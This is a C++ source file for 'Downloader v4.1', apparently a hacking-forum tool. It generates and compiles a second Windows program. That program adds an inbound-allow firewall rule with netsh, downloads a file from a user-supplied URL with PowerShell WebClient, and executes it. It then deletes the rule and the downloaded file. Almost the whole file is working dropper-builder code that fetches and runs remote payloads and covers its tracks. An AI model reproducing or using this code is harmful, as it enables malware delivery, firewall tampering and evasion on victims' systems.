// Downloader v4.1 by dEEpEst.cpp 

#include <cstdlib>
#include <iostream>
#include <fstream>
#include <string>

void print_header() {
    std::string header = R"(
    ____                      __                __             __                 ______________      ______     __ 
   / __ \____ _      ______  / /___  ____ _____/ /__  _____   / /_  __  __   ____/ / ____/ ____/___  / ____/____/ /_
  / / / / __ \ | /| / / __ \/ / __ \/ __ `/ __  / _ \/ ___/  / __ \/ / / /  / __  / __/ / __/ / __ \/ __/ / ___/ __/
 / /_/ / /_/ / |/ |/ / / / / / /_/ / /_/ / /_/ /  __/ /     / /_/ / /_/ /  / /_/ / /___/ /___/ /_/ / /___(__  ) /_  
/_____/\____/|__/|__/_/ /_/_/\____/\__,_/\__,_/\___/_/     /_.___/\__, /   \__,_/_____/_____/ .___/_____/____/\__/  
                                                                 /____/                    /_/                                                               
                                 
)";
    std::cout << "\033[31m" << header << "\033[34m" << "\nAuthor: dEEpEst" << "\nVersion: 4.1" << "\nDescription: Download an Internet file and run it" << "\nRequirements: Cl.exe (Visual Studio) at PATH" << "\nMode of use: Downloader.exe <URL> <fruit> <rule> <compiler route>" << "\nExample: Downloader v4.1 by dEEpEst.exe" << "\nRepository: https://github.com/LvL23HT/Downloader_by_dEEpEst" << "\nHome: https://level23hacktools.com" << "\033[32m" << std::endl;
} 

class DescargaYRegla {
private:
    std::string url;
    std::string archivo;
    std::string regla;
    std::string rutaCompilador;

public:
    DescargaYRegla(std::string url, std::string archivo, std::string regla, std::string rutaCompilador)
        : url(url), archivo(archivo), regla(regla), rutaCompilador(rutaCompilador) {
        generarArchivo();
        compilarArchivo();
    }

    void generarArchivo() {
        std::ofstream out("new_code.cpp");
        if (!out) {
            std::cerr << "No se pudo abrir el archivo new_code.cpp para escritura.\n";
            return;
        }
        out << "#include <iostream>\n";
        out << "#include <cstdlib>\n";
        out << "int main() {\n";
        out << "    std::cout << \"Create firewall exception\\n\";\n";
        out << "    if(system(\"netsh advfirewall firewall add rule name=\\\"" + regla + "\\\" dir=in action=allow enable=yes\") != 0) {\n";
        out << "        std::cerr << \"Failed to create firewall exception\\n\";\n";
        out << "        return 1;\n";
        out << "    }\n";
        out << "    std::cout << \"Download file\\n\";\n";
        out << "    if(system(\"powershell -Command \\\"(New-Object System.Net.WebClient).DownloadFile('" + url + "', '" + archivo + "')\\\"\") != 0) {\n";
        out << "        std::cerr << \"Failed to download file\\n\";\n";
        out << "        return 1;\n";
        out << "    }\n";
        out << "    std::cout << \"Run file\\n\";\n";
        out << "    if(system(\"" + archivo + "\") != 0) {\n";
        out << "        std::cerr << \"Failed to run file\\n\";\n";
        out << "        return 1;\n";
        out << "    }\n";
        out << "    std::cout << \"Remove firewall exception\\n\";\n";
        out << "    system(\"pause\");\n";  // Pause 
        out << "    if(system(\"netsh advfirewall firewall delete rule name=\\\"" + regla + "\\\"\") != 0) {\n";
        out << "        std::cerr << \"Failed to remove firewall exception\\n\";\n";
        out << "        return 1;\n";
        out << "    }\n";
        out << "    std::cout << \"Remove file\\n\";\n";
        out << "    if(system(\"del " + archivo + "\") != 0) {\n";
        out << "        std::cerr << \"Failed to remove file\\n\";\n";
        out << "        return 1;\n";
        out << "    }\n";
        out << "    std::cout << \"Exit\\n\";\n";
        out << "    return 0;\n";
        out << "}\n";
        out.close();
        if (!out) {
            std::cerr << "Hubo un error al escribir en el archivo new_code.cpp.\n";
        }
    }

    void compilarArchivo() {
        std::ofstream bat_file("compile.bat");
        if (bat_file.is_open()) {
            bat_file << "call \"" + rutaCompilador + "\\VsDevCmd.bat\"\n";
            bat_file << "cl /EHsc new_code.cpp /Fe:new_code.exe\n";
            bat_file.close();

            if (system("compile.bat") != 0) {
                std::cerr << "La compilación falló. Asegúrese de que cl.exe esté instalado y en su PATH.\n";
            }

            // opcional: elimina el archivo de comandos después de usarlo
            std::remove("compile.bat");
        }
        else {
            std::cerr << "No se pudo crear el archivo de comandos.\n";
        }
    }
};


std::string replaceSingleBackslashWithDouble(std::string str) {
    size_t index = 0;
    while (true) {
        index = str.find("\\", index);
        if (index == std::string::npos) break;
        str.replace(index, 1, "\\\\");
        index += 2;
    }
    return str;
}

int main() {
    print_header();
    std::string url;
    std::string archivo;
    std::string regla;
    std::string rutaCompilador;

    std::cout << "Please enter the file URL: ";
    std::getline(std::cin, url);

    std::cout << "Please enter the name of the file: ";
    std::getline(std::cin, archivo);

    std::cout << "Please introduce the name of the Firewall rule: ";
    std::getline(std::cin, regla);

    std::cout << "Please enter the Visual Studio compiler route (VsDevCmd.bat): ";
    std::getline(std::cin, rutaCompilador);
    rutaCompilador = replaceSingleBackslashWithDouble(rutaCompilador);

    DescargaYRegla proceso(url, archivo, regla, rutaCompilador);

    system("pause");
    return 0;
}
